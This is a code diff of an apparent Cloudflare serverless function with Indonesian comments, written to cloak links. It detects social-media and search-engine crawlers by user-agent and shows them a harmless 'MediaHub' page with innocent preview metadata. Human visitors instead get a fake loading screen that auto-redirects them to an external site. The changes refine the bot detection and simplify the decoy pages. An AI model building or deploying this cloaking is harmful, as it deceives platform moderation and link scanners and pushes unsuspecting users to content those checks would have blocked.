@@ -5,54 +5,58 @@ export async function onRequest(context) {
     const path = url.pathname;
     const host = request.headers.get('host');
     
-    // DETECTION YANG LEBIH ADVANCE
     const userAgent = request.headers.get('user-agent') || '';
-    const accept = request.headers.get('accept') || '';
-    
-    // Bot patterns yang lebih comprehensive
-    const isBot = 
-      userAgent.includes('Twitterbot') ||
-      userAgent.includes('facebookexternalhit') ||
-      userAgent.includes('WhatsApp') ||
-      userAgent.includes('TelegramBot') ||
-      userAgent.includes('Googlebot') ||
-      userAgent.includes('Bingbot') ||
-      userAgent.includes('Discordbot') ||
-      userAgent.includes('Slackbot') ||
-      /bot|crawler|spider|monitoring/i.test(userAgent) ||
-      accept.includes('*/*'); // Simple accept = mungkin bot
+    console.log(`User-Agent: ${userAgent.substring(0, 80)}`);
 
-    if (isBot) {
-      // SEMUA BOT: Kasih safe content (NO REDIRECT)
+    // BOT DETECTION YANG LEBIH SPECIFIC
+    // HANYA detect bot-bot yang jelas-jelas bot
+    const isDefiniteBot = 
+      userAgent.includes('Twitterbot') ||           // Twitter
+      userAgent.includes('facebookexternalhit') ||  // Facebook
+      userAgent.includes('WhatsApp') ||            // WhatsApp
+      userAgent.includes('TelegramBot') ||         // Telegram
+      userAgent.includes('Discordbot') ||          // Discord
+      userAgent.includes('Slackbot') ||            // Slack
+      userAgent.includes('Googlebot') ||           // Google
+      userAgent.includes('Bingbot') ||             // Bing
+      userAgent.includes('YandexBot') ||           // Yandex
+      userAgent.includes('DuckDuckBot') ||         // DuckDuckGo
+      userAgent.includes('LinkedInBot') ||         // LinkedIn
+      /crawler|spider|monitoring/i.test(userAgent); // General crawlers
+
+    console.log(`Is Bot: ${isDefiniteBot}`);
+
+    if (isDefiniteBot) {
+      // BOT: Kasih safe content (STUCK di sini)
+      console.log(`🛑 Bot detected - serving safe content`);
       return serveSafeContent(path, host);
     } else {
-      // HUMANS ONLY: Redirect
+      // HUMAN: Redirect
+      console.log(`👤 Human detected - redirecting`);
       return serveHumanRedirect(path);
     }
   } catch (error) {
+    console.error('Error:', error);
     return new Response('Error', { status: 500 });
   }
 }
 
-// ===== SAFE CONTENT UNTUK SEMUA BOT =====
+// ===== SAFE CONTENT UNTUK BOT (STUCK DI SINI) =====
 function serveSafeContent(path, host) {
   const pathId = path.split('/').pop() || 'content';
   
   const safeHtml = `<!DOCTYPE html>
 <html>
 <head>
-    <title>MediaHub - Video Content Platform</title>
+    <title>MediaHub - Digital Platform</title>
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="MediaHub - Digital Content Platform">
-    <meta name="twitter:description" content="Discover and share digital content on MediaHub platform">
-    <meta property="og:title" content="MediaHub - Content Platform">
-    <meta property="og:description" content="Digital content sharing and discovery platform">
-    <meta property="og:url" content="https://${host}${path}">
+    <meta name="twitter:title" content="MediaHub - Content Platform">
+    <meta name="twitter:description" content="Digital content platform for creators and viewers">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
-            color: white;
+            font-family: Arial, sans-serif;
+            background: #f8f9fa;
+            color: #333;
             margin: 0;
             padding: 40px 20px;
             min-height: 100vh;
@@ -62,33 +66,24 @@ function serveSafeContent(path, host) {
             text-align: center;
         }
         .container {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
+            background: white;
             padding: 40px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             max-width: 500px;
         }
-        h1 { margin-bottom: 15px; font-size: 2em; }
+        h1 { 
+            color: #2c5aa0; 
+            margin-bottom: 15px; 
+        }
         .content-id {
-            background: rgba(255,255,255,0.2);
-            padding: 10px 20px;
-            border-radius: 25px;
+            background: #e9ecef;
+            padding: 8px 16px;
+            border-radius: 20px;
             font-family: 'Courier New', monospace;
-            margin: 20px 0;
+            color: #495057;
+            margin: 15px 0;
             display: inline-block;
-        }
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 25px 0;
-        }
-        .feature {
-            background: rgba(255,255,255,0.1);
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 0.9em;
         }
     </style>
 </head>
@@ -99,30 +94,20 @@ function serveSafeContent(path, host) {
         
         <div class="content-id">Content ID: ${pathId}</div>
         
-        <div class="features">
-            <div class="feature">🔐 Secure</div>
-            <div class="feature">📱 Optimized</div>
-            <div class="feature">⚡ Fast</div>
-            <div class="feature">🌐 Global</div>
-        </div>
-        
-        <p>Platform for discovering and sharing digital content</p>
-        <div style="margin-top: 20px; font-size: 0.8em; opacity: 0.7;">
-            Trusted by content creators worldwide
+        <p>Platform for digital content sharing and discovery</p>
+        <div style="margin-top: 20px; color: #6c757d; font-size: 0.9em;">
+            Connect with creators worldwide
         </div>
     </div>
 </body>
 </html>`;
 
   return new Response(safeHtml, {
-    headers: { 
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'public, max-age=300'
-    }
+    headers: { 'Content-Type': 'text/html; charset=utf-8' }
   });
 }
 
-// ===== REDIRECT HANYA UNTUK HUMANS =====
+// ===== REDIRECT UNTUK HUMAN =====
 function serveHumanRedirect(path) {
   let targetUrl;
   
@@ -136,83 +121,56 @@ function serveHumanRedirect(path) {
     targetUrl = 'https://vide.ws/';
   }
 
-  // REDIRECT DENGAN DELAY (tidak instant)
+  console.log(`🎯 Redirecting human to: ${targetUrl}`);
+
+  // SIMPLE REDIRECT YANG WORK
   const html = `<!DOCTYPE html>
 <html>
 <head>
-    <title>MediaHub - Loading Content</title>
+    <title>Redirecting...</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: #1a1a1a;
-            color: white;
+            background: #f5f5f5;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #333;
         }
         .loading {
             text-align: center;
-            padding: 30px;
-            background: #2a2a2a;
-            border-radius: 10px;
-            border: 1px solid #444;
+            padding: 20px;
         }
         .spinner {
-            border: 3px solid #333;
-            border-top: 3px solid #6366f1;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
             border-radius: 50%;
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        .progress {
-            width: 200px;
-            height: 4px;
-            background: #333;
-            border-radius: 2px;
-            margin: 20px auto;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            background: #6366f1;
-            width: 0%;
-            animation: load 2.5s ease-in-out forwards;
-        }
-        @keyframes load {
-            0% { width: 0%; }
-            100% { width: 100%; }
         }
     </style>
 </head>
 <body>
     <div class="loading">
         <div class="spinner"></div>
-        <h3>Loading Your Content</h3>
-        <p>Preparing secure connection...</p>
-        
-        <div class="progress">
-            <div class="progress-bar"></div>
-        </div>
-        
-        <p style="font-size: 12px; color: #888;">
-            Securely accessing content...
-        </p>
+        <div>Loading your content...</div>
     </div>
     
     <script>
-        // REDIRECT SETELAH PROGRESS BAR SELESAI
+        // AUTO REDIRECT - TANPA KLIK
         setTimeout(function() {
+            console.log('Redirecting now to: ${targetUrl}');
             window.location.href = "${targetUrl}";
-        }, 2500);
+        }, 1500);
     </script>
 </body>
 </html>`;
